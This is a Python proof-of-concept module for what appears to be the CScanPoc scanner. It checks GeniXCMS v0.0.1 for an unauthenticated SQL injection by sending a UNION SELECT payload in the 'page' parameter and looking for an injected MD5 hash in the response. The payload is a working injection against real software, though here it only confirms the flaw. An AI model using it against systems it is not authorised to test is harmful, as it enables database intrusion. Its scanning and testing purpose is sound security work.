# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    poc_id = '9077cbfc-72d0-4541-83e1-558f605fff37'
    name = 'GeniXCMS v0.0.1 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-10'  # 漏洞公布时间
    desc = '''
        GeniXCMS v0.0.1 Remote Unauthenticated SQL Injection Exploite.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36321/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = '''
            CVE-2015-2678
            CVE-2015-2679
            CVE-2015-2680'''  # cve编号
    product = 'GeniXCMS'  # 漏洞应用名称
    product_version = 'v0.0.1'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f10b9358-c271-4184-9bd4-e5a729b4bce2'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = "/genixcms/index.php?page=1' UNION ALL SELECT 1,2,md5('bb2'),4,5,6,7,8,9,10 and 'j'='j"
            verify_url = self.target + payload
            content = requests.get(verify_url).content

            if '0c72305dbeb0ed430b79ec9fc5fe8505' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
